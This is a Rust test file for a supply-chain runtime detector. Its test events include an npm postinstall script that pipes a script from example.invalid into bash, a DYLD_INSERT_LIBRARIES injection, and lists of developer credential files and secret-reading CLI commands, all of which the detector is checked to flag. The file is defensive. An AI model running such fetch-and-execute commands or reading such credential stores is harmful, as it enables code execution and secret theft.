#[test]
fn supply_chain_guard_flags_risky_npm_postinstall_script() {
    let guard = SupplyChainRuntimeGuard::new();
    let event = observation(EndpointEvent::PackageScript {
        manager: PackageManager::Npm,
        package: Some("leftpad-plus".to_string()),
        phase: "postinstall".to_string(),
        script: "curl https://example.invalid/payload.sh | bash -c".to_string(),
        working_directory: Some("/tmp/pkg".to_string()),
    });

    let findings = guard.evaluate(&event);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].rule_id, "supply_chain.install_script.risky");
    assert_eq!(findings[0].severity, DetectionSeverity::High);
    assert!(findings[0].mitre_attack.contains(&"T1195.002".to_string()));
}

#[test]
fn supply_chain_guard_flags_unsigned_downloaded_binary() {
    let guard = SupplyChainRuntimeGuard::new();
    let mut event = observation(EndpointEvent::ProcessExec {
        image: "/Users/alice/Downloads/build-helper".to_string(),
        args: vec!["--postinstall".to_string()],
        env: BTreeMap::new(),
    });
    event.process.signing = CodeSignatureStatus {
        trust: SignatureTrust::Unsigned,
        notarized: Some(false),
        ..CodeSignatureStatus::default()
    };

    let findings = guard.evaluate(&event);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].rule_id, "supply_chain.unsigned_binary.dev_path");
}

#[test]
fn supply_chain_guard_flags_signature_drift_and_injection() {
    let guard = SupplyChainRuntimeGuard::new();
    let mut drift_event = observation(EndpointEvent::ProcessExec {
        image: "/usr/local/bin/developer-tool".to_string(),
        args: vec!["build".to_string()],
        env: BTreeMap::new(),
    });
    drift_event.process.signing = CodeSignatureStatus {
        trust: SignatureTrust::Signed,
        cdhash: Some("actual-cdhash".to_string()),
        expected_cdhash: Some("expected-cdhash".to_string()),
        notarized: Some(true),
        ..CodeSignatureStatus::default()
    };
    let mut injection_env = BTreeMap::new();
    injection_env.insert(
        "DYLD_INSERT_LIBRARIES".to_string(),
        "/tmp/libshim.dylib".to_string(),
    );
    let package_manager_injection = observation(EndpointEvent::ProcessExec {
        image: "/usr/local/bin/npm".to_string(),
        args: vec!["install".to_string()],
        env: injection_env,
    });
    let dylib_event = observation(EndpointEvent::DylibLoad {
        path: "/Users/alice/Library/Caches/libspy.dylib".to_string(),
        target_image: Some("/usr/local/bin/node".to_string()),
        mechanism: Some("DYLD_INSERT_LIBRARIES".to_string()),
    });

    let drift_findings = guard.evaluate(&drift_event);
    let package_manager_findings = guard.evaluate(&package_manager_injection);
    let dylib_findings = guard.evaluate(&dylib_event);

    assert!(drift_findings
        .iter()
        .any(|finding| finding.rule_id == "supply_chain.signature_drift"));
    assert!(package_manager_findings
        .iter()
        .any(|finding| finding.rule_id == "supply_chain.package_manager_dylib_injection"));
    assert!(dylib_findings
        .iter()
        .any(|finding| finding.rule_id == "supply_chain.dylib_injection"));
}

#[test]
fn supply_chain_guard_flags_persistence_and_unmanaged_browser_extensions() {
    let guard = SupplyChainRuntimeGuard::new();
    let launch_event = observation(EndpointEvent::LaunchPersistence {
        path: "/Users/alice/Library/LaunchAgents/com.example.updater.plist".to_string(),
        label: Some("com.example.updater".to_string()),
        operation: FileOperation::Create,
    });
    let extension_event = observation(EndpointEvent::BrowserExtensionInstall {
        browser: "chrome".to_string(),
        extension_id: Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_string()),
        path: "/Users/alice/Library/Application Support/Google/Chrome/Default/Extensions/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_string(),
        source: Some("developer_mode".to_string()),
    });

    let launch_findings = guard.evaluate(&launch_event);
    let extension_findings = guard.evaluate(&extension_event);

    assert!(launch_findings
        .iter()
        .any(|finding| finding.rule_id == "supply_chain.launch_persistence"));
    assert!(extension_findings
        .iter()
        .any(|finding| finding.rule_id == "supply_chain.unmanaged_browser_extension"));
}

#[test]
fn supply_chain_guard_flags_sensitive_cloud_cli_operations() {
    let guard = SupplyChainRuntimeGuard::new();
    let mut aws_env = BTreeMap::new();
    aws_env.insert("AWS_ACCESS_KEY_ID".to_string(), "AKIAEXAMPLE".to_string());
    aws_env.insert("AWS_SECRET_ACCESS_KEY".to_string(), "secret".to_string());
    let aws_event = observation(EndpointEvent::ProcessExec {
        image: "/opt/homebrew/bin/aws".to_string(),
        args: vec![
            "secretsmanager".to_string(),
            "get-secret-value".to_string(),
            "--secret-id".to_string(),
            "prod/db".to_string(),
        ],
        env: aws_env,
    });
    let gcloud_event = observation(EndpointEvent::ProcessExec {
        image: "/usr/local/bin/gcloud".to_string(),
        args: vec![
            "auth".to_string(),
            "print-access-token".to_string(),
            "--impersonate-service-account".to_string(),
            "deploy@example.iam.gserviceaccount.com".to_string(),
        ],
        env: BTreeMap::new(),
    });
    let github_event = observation(EndpointEvent::ProcessExec {
        image: "/opt/homebrew/bin/gh".to_string(),
        args: vec![
            "secret".to_string(),
            "set".to_string(),
            "PROD_DB_URL".to_string(),
            "--body".to_string(),
            "redacted".to_string(),
            "--repo".to_string(),
            "acme/service".to_string(),
        ],
        env: BTreeMap::new(),
    });
    let vercel_event = observation(EndpointEvent::ProcessExec {
        image: "/opt/homebrew/bin/vercel".to_string(),
        args: vec![
            "env".to_string(),
            "pull".to_string(),
            ".env.local".to_string(),
            "--environment".to_string(),
            "production".to_string(),
        ],
        env: BTreeMap::new(),
    });
    let netlify_event = observation(EndpointEvent::ProcessExec {
        image: "/opt/homebrew/bin/netlify".to_string(),
        args: vec![
            "env:get".to_string(),
            "API_KEY".to_string(),
            "--context".to_string(),
            "production".to_string(),
        ],
        env: BTreeMap::new(),
    });
    let mut wrangler_env = BTreeMap::new();
    wrangler_env.insert(
        "CLOUDFLARE_API_TOKEN".to_string(),
        "redacted-token".to_string(),
    );
    let wrangler_event = observation(EndpointEvent::ProcessExec {
        image: "/opt/homebrew/bin/wrangler".to_string(),
        args: vec![
            "secret".to_string(),
            "put".to_string(),
            "API_TOKEN".to_string(),
            "--env".to_string(),
            "production".to_string(),
        ],
        env: wrangler_env,
    });
    let mut doctl_env = BTreeMap::new();
    doctl_env.insert(
        "DIGITALOCEAN_ACCESS_TOKEN".to_string(),
        "redacted-token".to_string(),
    );
    let doctl_event = observation(EndpointEvent::ProcessExec {
        image: "/opt/homebrew/bin/doctl".to_string(),
        args: vec![
            "registry".to_string(),
            "docker-config".to_string(),
            "example-registry".to_string(),
            "--read-write".to_string(),
        ],
        env: doctl_env,
    });
    let mut fly_env = BTreeMap::new();
    fly_env.insert("FLY_API_TOKEN".to_string(), "redacted-token".to_string());
    let fly_event = observation(EndpointEvent::ProcessExec {
        image: "/opt/homebrew/bin/fly".to_string(),
        args: vec![
            "secrets".to_string(),
            "set".to_string(),
            "DATABASE_URL=postgres://example".to_string(),
            "--app".to_string(),
            "api".to_string(),
        ],
        env: fly_env,
    });

    let aws_findings = guard.evaluate(&aws_event);
    let gcloud_findings = guard.evaluate(&gcloud_event);
    let github_findings = guard.evaluate(&github_event);
    let vercel_findings = guard.evaluate(&vercel_event);
    let netlify_findings = guard.evaluate(&netlify_event);
    let wrangler_findings = guard.evaluate(&wrangler_event);
    let doctl_findings = guard.evaluate(&doctl_event);
    let fly_findings = guard.evaluate(&fly_event);

    let aws_finding = aws_findings
        .iter()
        .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
        .unwrap_or_else(|| panic!("missing AWS cloud CLI sensitive operation finding"));
    assert!(aws_finding
        .evidence
        .iter()
        .any(|item| item.key == "cloudCli" && item.value == "aws"));
    assert!(aws_finding
        .evidence
        .iter()
        .any(|item| item.key == "credentialEnvKeys" && item.value.contains("AWS_ACCESS_KEY_ID")));
    assert!(gcloud_findings
        .iter()
        .any(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation"));
    let github_finding = github_findings
        .iter()
        .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
        .unwrap_or_else(|| panic!("missing GitHub CLI sensitive operation finding"));
    assert!(github_finding
        .evidence
        .iter()
        .any(|item| item.key == "cloudCli" && item.value == "gh"));
    let vercel_finding = vercel_findings
        .iter()
        .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
        .unwrap_or_else(|| panic!("missing Vercel CLI sensitive operation finding"));
    assert!(vercel_finding
        .evidence
        .iter()
        .any(|item| item.key == "cloudCli" && item.value == "vercel"));
    let netlify_finding = netlify_findings
        .iter()
        .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
        .unwrap_or_else(|| panic!("missing Netlify CLI sensitive operation finding"));
    assert!(netlify_finding
        .evidence
        .iter()
        .any(|item| item.key == "cloudCli" && item.value == "netlify"));
    let wrangler_finding = wrangler_findings
        .iter()
        .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
        .unwrap_or_else(|| panic!("missing Wrangler CLI sensitive operation finding"));
    assert!(wrangler_finding
        .evidence
        .iter()
        .any(|item| item.key == "cloudCli" && item.value == "wrangler"));
    assert!(
        wrangler_finding
            .evidence
            .iter()
            .any(|item| item.key == "credentialEnvKeys"
                && item.value.contains("CLOUDFLARE_API_TOKEN"))
    );
    let doctl_finding = doctl_findings
        .iter()
        .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
        .unwrap_or_else(|| panic!("missing doctl CLI sensitive operation finding"));
    assert!(doctl_finding
        .evidence
        .iter()
        .any(|item| item.key == "cloudCli" && item.value == "doctl"));
    assert!(doctl_finding
        .evidence
        .iter()
        .any(|item| item.key == "credentialEnvKeys"
            && item.value.contains("DIGITALOCEAN_ACCESS_TOKEN")));
    let fly_finding = fly_findings
        .iter()
        .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
        .unwrap_or_else(|| panic!("missing Fly CLI sensitive operation finding"));
    assert!(fly_finding
        .evidence
        .iter()
        .any(|item| item.key == "cloudCli" && item.value == "fly"));
    assert!(fly_finding
        .evidence
        .iter()
        .any(|item| item.key == "credentialEnvKeys" && item.value.contains("FLY_API_TOKEN")));
}

#[test]
fn supply_chain_guard_flags_secret_management_and_platform_cli_operations() {
    let guard = SupplyChainRuntimeGuard::new();
    let cases = [
        (
            "/opt/homebrew/bin/op",
            vec!["item", "get", "prod/api-token"],
            "OP_SERVICE_ACCOUNT_TOKEN",
            "op",
        ),
        (
            "/usr/local/bin/vault",
            vec!["kv", "get", "secret/prod/api"],
            "VAULT_TOKEN",
            "vault",
        ),
        (
            "/opt/homebrew/bin/doppler",
            vec!["secrets", "download", "--no-file"],
            "DOPPLER_TOKEN",
            "doppler",
        ),
        (
            "/opt/homebrew/bin/heroku",
            vec!["config:get", "DATABASE_URL", "--app", "prod-api"],
            "HEROKU_API_KEY",
            "heroku",
        ),
        (
            "/opt/homebrew/bin/supabase",
            vec!["secrets", "list", "--project-ref", "prodref"],
            "SUPABASE_ACCESS_TOKEN",
            "supabase",
        ),
        (
            "/opt/homebrew/bin/firebase",
            vec![
                "functions:secrets:access",
                "STRIPE_WEBHOOK_SECRET",
                "--project",
                "prod-api",
            ],
            "FIREBASE_TOKEN",
            "firebase",
        ),
        (
            "/opt/homebrew/bin/railway",
            vec!["variables", "--service", "api"],
            "RAILWAY_TOKEN",
            "railway",
        ),
        (
            "/opt/homebrew/bin/stripe",
            vec!["login", "--api-key", "sk_test_redacted"],
            "STRIPE_API_KEY",
            "stripe",
        ),
        (
            "/opt/homebrew/bin/stripe",
            vec![
                "listen",
                "--print-secret",
                "--forward-to",
                "localhost:4242/webhook",
            ],
            "STRIPE_WEBHOOK_SECRET",
            "stripe",
        ),
        (
            "/opt/homebrew/bin/sentry-cli",
            vec!["login", "--auth-token=sk-SENTRYTOKEN_1234567890abcdef"],
            "SENTRY_AUTH_TOKEN",
            "sentry",
        ),
        (
            "/opt/homebrew/bin/snyk",
            vec!["auth", "--auth-token=sk-SNYKTOKEN_1234567890abcdef"],
            "SNYK_TOKEN",
            "snyk",
        ),
        (
            "/opt/homebrew/bin/bw",
            vec!["get", "item", "prod/api-token"],
            "BW_SESSION",
            "bitwarden",
        ),
        (
            "/opt/homebrew/bin/kubectl",
            vec!["get", "secret", "prod-token", "-o", "yaml"],
            "KUBECONFIG",
            "kubectl",
        ),
        (
            "/opt/homebrew/bin/pulumi",
            vec!["config", "get", "dbPassword", "--show-secrets"],
            "PULUMI_ACCESS_TOKEN",
            "pulumi",
        ),
        (
            "/opt/homebrew/bin/circleci",
            vec![
                "context",
                "store-secret",
                "github",
                "acme",
                "production",
                "DATABASE_URL",
            ],
            "CIRCLECI_CLI_TOKEN",
            "circleci",
        ),
        (
            "/opt/homebrew/bin/glab",
            vec![
                "variable",
                "set",
                "DATABASE_URL",
                "postgres://redacted",
                "--masked",
            ],
            "GITLAB_TOKEN",
            "glab",
        ),
        (
            "/usr/local/bin/buildkite-agent",
            vec!["secret", "get", "deploy_key"],
            "BUILDKITE_AGENT_ACCESS_TOKEN",
            "buildkite",
        ),
        (
            "/usr/local/bin/drone",
            vec!["secret", "get", "acme/service", "deploy_key"],
            "DRONE_TOKEN",
            "drone",
        ),
        (
            "/opt/homebrew/bin/sem",
            vec!["secret", "create", "DATABASE_URL", "--value", "redacted"],
            "SEMAPHORE_API_TOKEN",
            "semaphore",
        ),
        (
            "/usr/local/bin/appveyor",
            vec!["encrypt", "--secret", "deploy-key"],
            "APPVEYOR_API_TOKEN",
            "appveyor",
        ),
        (
            "/usr/local/bin/woodpecker",
            vec!["secret", "list", "--repository", "acme/service"],
            "WOODPECKER_TOKEN",
            "woodpecker",
        ),
        (
            "/usr/local/bin/codefresh",
            vec!["auth", "create-token", "--scope", "pipeline:run"],
            "CODEFRESH_API_KEY",
            "codefresh",
        ),
        (
            "/opt/homebrew/bin/terraform",
            vec!["output", "-json"],
            "TF_TOKEN_app_terraform_io",
            "terraform",
        ),
        (
            "/opt/homebrew/bin/terragrunt",
            vec!["state", "pull"],
            "TERRAFORM_TOKEN",
            "terragrunt",
        ),
        (
            "/opt/homebrew/bin/tofu",
            vec!["show", "-json"],
            "TFE_TOKEN",
            "opentofu",
        ),
    ];

    for (image, args, env_key, expected_cli) in cases {
        let mut env = BTreeMap::new();
        env.insert(env_key.to_string(), "redacted".to_string());
        let event = observation(EndpointEvent::ProcessExec {
            image: image.to_string(),
            args: args.into_iter().map(str::to_string).collect(),
            env,
        });

        let findings = guard.evaluate(&event);

        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| {
                panic!("missing sensitive CLI operation finding for {expected_cli}")
            });
        assert!(
            finding
                .evidence
                .iter()
                .any(|item| item.key == "cloudCli" && item.value == expected_cli),
            "missing cloudCli evidence for {expected_cli}"
        );
        assert!(
            finding
                .evidence
                .iter()
                .any(|item| item.key == "credentialEnvKeys" && item.value.contains(env_key)),
            "missing credential environment evidence for {expected_cli}"
        );
    }
}

#[test]
fn supply_chain_guard_flags_package_registry_token_cli_operations() {
    let guard = SupplyChainRuntimeGuard::new();
    let mut env = BTreeMap::new();
    env.insert("NODE_AUTH_TOKEN".to_string(), "redacted".to_string());
    let event = observation(EndpointEvent::ProcessExec {
        image: "/usr/local/bin/npm".to_string(),
        args: vec![
            "token".to_string(),
            "list".to_string(),
            "--json".to_string(),
        ],
        env,
    });

    let findings = guard.evaluate(&event);

    let finding = findings
        .iter()
        .find(|finding| finding.rule_id == "supply_chain.package_registry_token_operation")
        .unwrap_or_else(|| panic!("missing package registry token operation finding"));
    assert!(finding
        .evidence
        .iter()
        .any(|item| item.key == "packageManager" && item.value == "npm"));
    assert!(finding
        .evidence
        .iter()
        .any(|item| item.key == "packageRegistryRisk"
            && item.value.contains("npm authentication tokens")));
    assert!(finding
        .evidence
        .iter()
        .any(|item| item.key == "credentialEnvKeys" && item.value.contains("NODE_AUTH_TOKEN")));
}

#[test]
fn supply_chain_guard_flags_developer_cli_token_store_access() {
    let guard = SupplyChainRuntimeGuard::new();
    let cases = [
        "/Users/alice/.config/gh/hosts.yml",
        "/Users/alice/.config/glab-cli/config.yml",
        "/Users/alice/.config/hub",
    ];

    for path in cases {
        let event = observation(EndpointEvent::CredentialAccess {
            kind: CredentialKind::Other("unknown".to_string()),
            path: Some(path.to_string()),
            name: Some("cli-token-store".to_string()),
        });

        let findings = guard.evaluate(&event);

        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.developer_secret_access")
            .unwrap_or_else(|| panic!("missing developer secret finding for {path}"));
        assert!(
            finding
                .evidence
                .iter()
                .any(|item| item.key == "path" && item.value == path),
            "missing path evidence for {path}"
        );
    }
}

#[test]
fn supply_chain_guard_flags_local_signing_key_store_access() {
    let guard = SupplyChainRuntimeGuard::new();
    let cases = [
        "/Users/alice/.config/sops/age/keys.txt",
        "/Users/alice/.age/key.txt",
        "/Users/alice/.gnupg/private-keys-v1.d/ABCD1234.key",
        "/Users/alice/.gnupg/secring.gpg",
    ];

    for path in cases {
        let event = observation(EndpointEvent::CredentialAccess {
            kind: CredentialKind::Other("unknown".to_string()),
            path: Some(path.to_string()),
            name: Some("signing-key-store".to_string()),
        });

        let findings = guard.evaluate(&event);

        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.developer_secret_access")
            .unwrap_or_else(|| panic!("missing developer secret finding for {path}"));
        assert!(
            finding
                .evidence
                .iter()
                .any(|item| item.key == "path" && item.value == path),
            "missing path evidence for {path}"
        );
    }
}

#[test]
fn supply_chain_guard_flags_cloud_credential_store_access() {
    let guard = SupplyChainRuntimeGuard::new();
    let cases = [
        "/Users/alice/.kube/config",
        "/Users/alice/.terraform.d/credentials.tfrc.json",
        "/Users/alice/.terraformrc",
        "/Users/alice/.config/pulumi/credentials.json",
        "/Users/alice/.pulumi/credentials.json",
    ];

    for path in cases {
        let event = observation(EndpointEvent::CredentialAccess {
            kind: CredentialKind::Other("unknown".to_string()),
            path: Some(path.to_string()),
            name: Some("cloud-credential-store".to_string()),
        });

        let findings = guard.evaluate(&event);

        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.developer_secret_access")
            .unwrap_or_else(|| panic!("missing developer secret finding for {path}"));
        assert!(
            finding
                .evidence
                .iter()
                .any(|item| item.key == "path" && item.value == path),
            "missing path evidence for {path}"
        );
    }
}

#[test]
fn supply_chain_guard_flags_package_manager_credential_store_access() {
    let guard = SupplyChainRuntimeGuard::new();
    let cases = [
        "/Users/alice/.yarnrc.yml",
        "/Users/alice/.config/pip/pip.conf",
        "/Users/alice/.config/pypoetry/auth.toml",
        "/Users/alice/Library/Application Support/pypoetry/auth.toml",
        "/Users/alice/.m2/settings.xml",
        "/Users/alice/.gradle/gradle.properties",
        "/Users/alice/.nuget/NuGet/NuGet.Config",
    ];

    for path in cases {
        let event = observation(EndpointEvent::CredentialAccess {
            kind: CredentialKind::Other("unknown".to_string()),
            path: Some(path.to_string()),
            name: Some("package-manager-credential-store".to_string()),
        });

        let findings = guard.evaluate(&event);

        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.developer_secret_access")
            .unwrap_or_else(|| panic!("missing developer secret finding for {path}"));
        assert!(
            finding
                .evidence
                .iter()
                .any(|item| item.key == "path" && item.value == path),
            "missing path evidence for {path}"
        );
    }
}

#[test]
fn policy_event_browser_cookie_secret_can_trigger_honey_deception() {
    let root = temp_root();
    let plan = DeceptionPlan::standard(&root, "endpoint-a");
    let artifact = plan
        .artifacts
        .iter()
        .find(|artifact| artifact.kind == HoneyArtifactKind::BrowserCookieJar)
        .unwrap();
    let event = PolicyEvent {
        event_id: "policy-cookie-1".to_string(),
        event_type: PolicyEventType::SecretAccess,
        timestamp: Utc::now(),
        session_id: Some("session".to_string()),
        data: PolicyEventData::Secret(crate::event::SecretEventData {
            secret_name: format!("intranet.invalid/session={}", artifact.marker),
            scope: "browser_cookie".to_string(),
        }),
        metadata: None,
        context: None,
    };

    let observation = EndpointObservation::from_policy_event(&event);

    match &observation.event {
        EndpointEvent::CredentialAccess { kind, .. } => {
            assert_eq!(kind, &CredentialKind::BrowserCookie);
        }
        other => panic!("unexpected event: {other:?}"),
    }

    let findings = SupplyChainRuntimeGuard::with_honey_artifacts(plan.artifacts.clone())
        .evaluate(&observation);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].rule_id, "deception.honey_artifact_touched");
    assert!(findings[0]
        .evidence
        .iter()
        .any(|item| item.key == "matchType" && item.value == "browser_cookie"));

    let _ = fs::remove_dir_all(root);
}

